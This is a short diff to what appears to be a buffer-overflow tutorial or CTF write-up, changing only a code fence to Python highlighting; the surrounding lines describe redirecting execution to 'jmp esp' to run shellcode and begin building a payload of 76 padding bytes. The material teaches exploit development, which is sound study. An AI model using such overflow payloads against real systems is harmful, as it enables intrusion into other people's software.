@@ -353,7 +353,7 @@ Then, once we redirect code flow to `jmp esp`, `$esp` itself will move.
 
 Then we execute our arbitrary shellcode.  Let's try it out!
 
-```
+```python
 payload = ''
 payload += 'A'*76
 # p32() is used to convert an integer to a binary string of the correct endianness for your binary
